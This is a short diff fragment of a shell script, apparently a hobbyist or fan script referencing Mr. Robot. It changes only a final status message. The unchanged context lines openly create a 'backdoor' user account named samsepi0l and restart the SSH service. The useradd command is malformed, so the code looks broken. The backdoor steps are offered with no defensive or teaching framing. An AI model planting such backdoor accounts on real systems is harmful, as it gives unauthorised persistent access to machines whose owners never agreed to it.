@@ -4,4 +4,4 @@ echo "creating backdoor usr..."
 useradd -M 'password' samsepi0l 
 echo "restarting ssh service..."
 service ssh restart
-echo "HOPEFULLY COMPLETE"
+echo "failiure"
